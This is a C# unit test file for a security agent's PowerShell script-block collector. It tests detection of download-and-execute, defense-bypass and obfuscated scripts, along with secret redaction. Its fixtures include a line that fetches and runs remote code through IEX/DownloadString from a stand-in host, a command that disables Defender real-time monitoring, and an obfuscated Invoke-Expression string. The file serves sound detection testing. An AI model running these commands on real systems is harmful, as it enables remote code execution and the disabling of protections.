using FluentAssertions;
using Sentinel.Agent.Collectors;
using Sentinel.Shared.Models;
using Xunit;

namespace Sentinel.Agent.Tests;

public sealed class ScriptVisibilityTests
{
    private const string Benign4104Xml = """
        <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
          <System>
            <EventID>4104</EventID>
            <TimeCreated SystemTime="2026-11-22T14:00:00Z" />
            <Execution ProcessID="3120" />
          </System>
          <EventData>
            <Data Name="ScriptBlockId">abc-111</Data>
            <Data Name="ScriptBlockText">Get-ChildItem -Path C:\Projects | Select-Object Name, Length</Data>
            <Data Name="Path">C:\Scripts\list.ps1</Data>
          </EventData>
        </Event>
        """;

    private const string EncodedDownloadExec4104Xml = """
        <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
          <System>
            <EventID>4104</EventID>
            <TimeCreated SystemTime="2026-11-22T14:01:00Z" />
            <Execution ProcessID="4880" />
          </System>
          <EventData>
            <Data Name="ScriptBlockId">def-222</Data>
            <Data Name="ScriptBlockText">$c = New-Object Net.WebClient; IEX ($c.DownloadString('http://sim.example.test/benign.ps1')); password=SuperSecret123</Data>
            <Data Name="Path"></Data>
          </EventData>
        </Event>
        """;

    private const string LoggingBypass4104Xml = """
        <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
          <System>
            <EventID>4104</EventID>
            <TimeCreated SystemTime="2026-11-22T14:02:00Z" />
            <Execution ProcessID="4990" />
          </System>
          <EventData>
            <Data Name="ScriptBlockId">ghi-333</Data>
            <Data Name="ScriptBlockText">Set-MpPreference -DisableRealtimeMonitoring $true; # test simulation EnableScriptBlockLogging</Data>
            <Data Name="Path"></Data>
          </EventData>
        </Event>
        """;

    [Fact]
    public void BenignScriptBlock_IsIgnoredToPreservePrivacy()
    {
        var evt = ScriptVisibilityCollector.AnalyzeScriptBlockXml(Benign4104Xml, "HOST-01");
        evt.Should().BeNull();
    }

    [Fact]
    public void SuspiciousDownloadExec4104_ProducesMetadataOnlyByDefaultAndRedactsWhenExcerptEnabled()
    {
        // Par défaut : aucun extrait de script stocké (confidentialité stricte)
        var evtNoExcerpt = ScriptVisibilityCollector.AnalyzeScriptBlockXml(EncodedDownloadExec4104Xml, "HOST-01", storeSanitizedExcerpt: false);
        evtNoExcerpt.Should().NotBeNull();
        evtNoExcerpt!.Category.Should().Be(EventCategory.Script);
        evtNoExcerpt.EventType.Should().Be(EventTypes.PowerShellScriptBlock);
        evtNoExcerpt.Attr(AttributeKeys.ScriptIndicators).Should().Contain("DownloadAndExecute");
        evtNoExcerpt.Attr(AttributeKeys.ScriptHash).Should().HaveLength(64);
        evtNoExcerpt.Attr(AttributeKeys.ScriptExcerpt).Should().BeNull();

        // Avec extrait activé : secrets caviardés
        var evtWithExcerpt = ScriptVisibilityCollector.AnalyzeScriptBlockXml(EncodedDownloadExec4104Xml, "HOST-01", storeSanitizedExcerpt: true, maxExcerptLength: 200);
        evtWithExcerpt.Should().NotBeNull();
        evtWithExcerpt!.Attr(AttributeKeys.ScriptExcerpt).Should().NotBeNullOrWhiteSpace();
        evtWithExcerpt.Attr(AttributeKeys.ScriptExcerpt).Should().Contain("[REDACTED]");
        evtWithExcerpt.Attr(AttributeKeys.ScriptExcerpt).Should().NotContain("SuperSecret123");
    }

    [Fact]
    public void LoggingBypass4104_ClassifiedAsScriptLoggingBypass()
    {
        var evt = ScriptVisibilityCollector.AnalyzeScriptBlockXml(LoggingBypass4104Xml, "HOST-01");
        evt.Should().NotBeNull();
        evt!.EventType.Should().Be(EventTypes.ScriptLoggingBypass);
        evt.Attr(AttributeKeys.ScriptIndicators).Should().Contain("LoggingOrDefenseBypass");
    }

    [Fact]
    public void ObfuscationScore_DetectsHeavyBacktickAndCharEncoding()
    {
        var benignScore = ScriptVisibilityCollector.ComputeObfuscationScore("Write-Output 'Hello World'");
        var obfScore = ScriptVisibilityCollector.ComputeObfuscationScore("I`n`v`o`k`e`-`E`x`p`r`e`s`s`i`o`n (([char]105+[char]101+[char]120) -join '')");

        benignScore.Should().BeLessThan(0.2);
        obfScore.Should().BeGreaterThanOrEqualTo(0.55);
    }
}
